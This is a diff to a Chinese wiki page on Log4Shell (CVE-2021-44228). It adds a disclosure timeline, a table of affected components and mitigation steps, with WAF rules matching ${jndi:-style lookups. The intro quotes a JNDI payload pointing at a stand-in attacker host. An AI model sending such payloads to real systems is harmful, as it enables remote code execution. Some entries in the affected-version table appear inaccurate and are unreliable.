@@ -1,7 +1,7 @@
 ---
 title: Log4j2 (Log4Shell) RCE 漏洞复现全过程
-description: 详细记录 Log4j2 CVE-2021-44228 (Log4Shell) 远程代码执行漏洞的环境搭建、JNDI 注入利用链构造、DNSLog
-  验证、反弹 Shell 实战及权限维持（添加用户）完整复现流程。
+description: 详细记录 Log4j2 CVE-2021-44228 (Log4Shell) 远程代码执行漏洞的披露时间线、阿里云安全团队上报细节、受影响下游组件清单、初期缓解建议（升级至
+  2.15.0-rc1），以及环境搭建、JNDI 注入利用链构造、DNSLog 验证、反弹 Shell 实战及权限维持（添加用户）完整复现流程。
 category: program-analysis
 tags:
 - Log4j2
@@ -14,6 +14,8 @@ tags:
 - 权限维持
 - 漏洞复现
 - 渗透测试
+- 供应链安全
+- 阿里云安全
 date: 2021-12-15
 updated: '2026-11-15'
 ---
@@ -22,7 +24,80 @@ updated: '2026-11-15'
 
 **Log4Shell (CVE-2021-44228)** 是 Apache Log4j 2 中的一个严重远程代码执行漏洞，影响版本 2.0-beta9 至 2.14.1。攻击者可通过构造恶意 JNDI 查询载荷（如 `${jndi:ldap://attacker.com/payload}`），触发 Log4j2 的 JNDI 查找功能，从远程 LDAP/RMI 服务器加载恶意 Java 类并执行任意代码。
 
-本页面基于实战复现记录，系统梳理从环境搭建、漏洞验证、JNDI 注入利用、反弹 Shell 到权限维持的完整攻击链，并关联内网渗透、C2 基础设施、漏洞测试框架等后续利用生态。
+本页面基于实战复现记录，系统梳理从漏洞披露时间线、供应链影响范围、初期缓解建议到环境搭建、漏洞验证、JNDI 注入利用、反弹 Shell 及权限维持的完整攻击链，并关联内网渗透、C2 基础设施、漏洞测试框架等后续利用生态。
+
+## 漏洞披露时间线与背景
+
+### 关键时间节点
+
+| 时间 | 事件 | 说明 |
+|------|------|------|
+| **2021-11-24** | **阿里云安全团队向 Apache 官方报告漏洞** | 阿里云应急响应中心发现并负责任地披露，触发官方修复流程 |
+| **2021-12-09** | 漏洞细节公开，PoC/EXP 广泛传播 | 互联网上出现大量利用代码，在野利用活动激增 |
+| **2021-12-10** | Apache 发布 log4j-2.15.0-rc1 版本 | 首个修复版本，地址：<https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1> |
+| **2021-12-13** | Apache 发布 2.15.0 正式版 | 修复 CVE-2021-44228，但后续发现绕过导致 CVE-2021-45046 |
+| **2021-12-17** | Apache 发布 2.16.0 版本 | 彻底禁用 JNDI 查找，移除 Message Lookup 机制 |
+| **2021-12-28** | Apache 发布 2.17.0/2.17.1 版本 | 修复 CVE-2021-45105 (DoS) 及 CVE-2021-44832 (RCE) |
+
+### 漏洞成因简述
+
+Apache Log4j2 的 `MessagePatternConverter` 在处理 `${prefix:name}` 语法时，支持递归解析与 JNDI 查找功能。当 `prefix` 为 `jndi` 时，会触发 `JndiManager.lookup()` 发起远程 JNDI 查找，攻击者可控制 LDAP/RMI 服务器返回恶意 Java 类引用，目标 JVM 在反序列化/类加载过程中执行任意代码。**利用无需特殊配置，默认即可触发。**
+
+## 供应链影响范围（下游组件清单）
+
+因 Log4j2 作为 Java 生态核心日志框架，大量上游框架/中间件传递依赖受影响。阿里云安全团队验证及社区确认的**已知受影响应用及组件**包括但不限于：
+
+| 组件/框架 | 说明 | 典型影响版本 |
+|-----------|------|--------------|
+| **Apache Struts 2** | 核心 Web 框架，历史高危漏洞重灾区 | 所有依赖 Log4j2 的版本 |
+| **Apache Solr** | 搜索平台，Admin UI / 查询接口可触发 | 所有版本（含 8.x） |
+| **Apache Druid** | 实时分析数据库，HTTP 端点记录日志 | 所有版本 |
+| **Apache Flink** | 流处理引擎，JobManager/TaskManager 日志 | 所有版本 |
+| **spring-boot-starter-logging** / **spring-boot-starter-log4j2** | Spring Boot 默认日志启动器 | 2.x 全系（需排除/升级依赖） |
+| **Apache Dubbo** | RPC 框架，Provider/Consumer 端日志 | 2.7.x、3.x |
+| **Apache Kafka** | 消息队列，Broker/Connect 日志 | 2.x、3.x |
+| **Elasticsearch / OpenSearch** | 搜索引擎，节点日志记录 | 7.x、8.x |
+| **VMware vCenter / Horizon** | 企业级虚拟化管理套件 | 多个版本受影响，官方发布紧急补丁 |
+| **百度、iCloud 等大型互联网服务** | 早期披露即确认存在漏洞 | — |
+
+> **排查建议**：使用 `mvn dependency:tree | grep log4j`、`gradle dependencies | grep log4j`、`docker image history` 等手段全量梳理资产依赖链。参考 [[vulnerability-mining-recon-aiqicha-fofa]] 资产测绘方法论结合 FOFA/ZoomEye 语法（如 `app="Apache Log4j" || header="log4j"`）进行外部资产发现。
+
+## 初期缓解建议（官方发布 2.15.0-rc1 前后）
+
+在官方修复版本发布前及发布初期，阿里云应急响应中心及社区推荐的**临时缓解措施**：
+
+1. **升级至 log4j-2.15.0-rc1 或更高版本**（首选）  
+   下载地址：<https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1>  
+   Maven 坐标示例：
+   ```xml
+   <dependency>
+       <groupId>org.apache.logging.log4j</groupId>
+       <artifactId>log4j-core</artifactId>
+       <version>2.15.0-rc1</version>
+   </dependency>
+   <dependency>
+       <groupId>org.apache.logging.log4j</groupId>
+       <artifactId>log4j-api</artifactId>
+       <version>2.15.0-rc1</version>
+   </dependency>
+   ```
+
+2. **JVM 启动参数禁用 JNDI Lookup**（Log4j 2.10.0+ 有效）  
+   `-Dlog4j2.formatMsgNoLookups=true`
+
+3. **移除 JndiLookup 类（物理隔离）**  
+   ```bash
+   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+   ```
+   针对 Spring Boot Fat Jar 需解压后处理 `BOOT-INF/lib/` 下的 jar 包。
+
+4. **网络层阻断出站 JNDI 协议**  
+   防火墙/安全组拦截目标主机向外发起的 LDAP(389/636)、RMI(1099)、LDAPS、HTTP 等疑似恶意类加载请求。
+
+5. **WAF/流量层特征拦截**  
+   规则匹配 `${jndi:`、`${lower:`、`${upper:`、`${env:`、`${sys:` 等 Lookup 模式；注意攻击者可使用嵌套编码、Base64、Unicode 混淆绕过。
+
+> **注意**：2.15.0-rc1 仅修复 CVE-2021-44228，后续发现 **CVE-2021-45046**（Thread Context Map 绕过）、**CVE-2021-45105**（递归解析导致 DoS）、**CVE-2021-44832**（非默认配置下 RCE）。**最终建议统一升级至 2.17.1+**（含所有修复）。
 
 ## 环境搭建
 
@@ -184,8 +259,10 @@ ssh admin@<target-ip>
 
 ## 结语
 
-Log4Shell 因其影响面广、利用门槛低、危害极大，成为近年最典型的供应链级 RCE 漏洞。掌握其完整复现流程、JNDI 注入机制、后利用拓展及检测缓解体系，是红蓝对抗、HVV 护网、漏洞研究人员的必修课。建议结合上述交叉引用页面，构建从「漏洞触发 → 落地立足 → 内网横向 → 权限维持 → 溯源清理」的全链路攻防知识图谱。
+Log4Shell 因其影响面广、利用门槛低、危害极大，成为近年最典型的供应链级 RCE 漏洞。掌握其完整披露时间线、供应链影响范围、初期缓解演进、完整复现流程、JNDI 注入机制、后利用拓展及检测缓解体系，是红蓝对抗、HVV 护网、漏洞研究人员的必修课。建议结合上述交叉引用页面，构建从「漏洞触发 → 落地立足 → 内网横向 → 权限维持 → 溯源清理」的全链路攻防知识图谱。
 
 ## 来源
 
 - [0x6270安全团队-202203-202304_46](../sources/0x6270安全团队-202203-202304_46.md)
+- [Apache Log4j 远程代码执行漏洞以及修复建议](../sources/Apache Log4j 远程代码执行漏洞以及修复建议.md)
+- [0xfafu攻防实验室-202010-202112_04](../sources/0xfafu攻防实验室-202010-202112_04.md)
